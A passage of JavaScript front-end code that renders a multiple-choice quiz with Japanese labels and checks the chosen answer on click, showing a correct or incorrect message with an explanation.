                    <div style="display: flex; flex-direction: column; gap: 6px;">
            `;
            q.options.forEach((opt, oIdx) => {
                html += `
                    <label style="cursor: pointer; font-size: 13px; padding: 6px; border-radius: 4px; background-color: rgba(255,255,255,0.03);">
                        <input type="radio" name="quiz_${idx}" value="${oIdx}"> ${opt}
                    </label>
                `;
            });
            html += `
                    </div>
                    <button class="btn btn-secondary btn-check-quiz" data-quiz="${idx}" style="margin-top: 10px; font-size: 12px; padding: 4px 12px;">回答を確認</button>
                    <div id="quiz-exp-${idx}" style="display: none; margin-top: 10px; padding: 10px; background-color: rgba(59, 130, 246, 0.1); border-left: 4px solid #3b82f6; font-size: 13px;"></div>
                </div>
            `;
        });

        quizContainer.innerHTML = html;

        // Quiz checking event listeners
        const btns = quizContainer.querySelectorAll(".btn-check-quiz");
        btns.forEach(btn => {
            btn.addEventListener("click", function () {
                const qIdx = parseInt(this.getAttribute("data-quiz"), 10);
                const selected = quizContainer.querySelector(`input[name="quiz_${qIdx}"]:checked`);
                const expBox = document.getElementById(`quiz-exp-${qIdx}`);
                if (!selected) {
                    alert("選択肢を選んでください。");
                    return;
                }
                const val = parseInt(selected.value, 10);
                if (expBox) {
                    expBox.style.display = "block";
                    if (val === questions[qIdx].answer) {
                        expBox.innerHTML = `<span style="color: var(--color-success); font-weight: bold;">正解！🎉</span><br>${questions[qIdx].exp}`;
                    } else {
                        expBox.innerHTML = `<span style="color: var(--color-danger); font-weight: bold;">不正解...</span><br>${questions[qIdx].exp}`;
                    }
                }
            });
        });
    }
};
